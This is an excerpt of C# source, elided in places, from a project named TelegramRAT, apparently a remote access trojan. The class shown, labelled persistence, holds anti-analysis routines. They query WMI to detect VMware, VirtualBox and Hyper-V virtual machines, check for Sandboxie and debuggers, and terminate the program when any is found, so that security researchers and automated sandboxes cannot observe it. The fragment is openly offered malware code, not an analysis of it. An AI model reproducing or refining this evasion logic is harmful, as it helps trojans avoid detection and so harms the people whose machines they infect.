...
namespace TelegramRAT
{
    internal sealed class persistence
    {
        ...
        // VirtualBox
        public static bool inVirtualMachine()
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                try
                {
                    using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                    {
                        ...
                        {
                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox" || managementBaseObject["Model"].ToString() == "hyper-v")
                            {
                                return true;
                            }
                        }
        ...
        public static void runAntiAnalysis()
        {
            ...
            {
                if (inSandboxie() || inVirtualMachine() || inDebugger())
                    Environment.Exit(2);
            }
        }
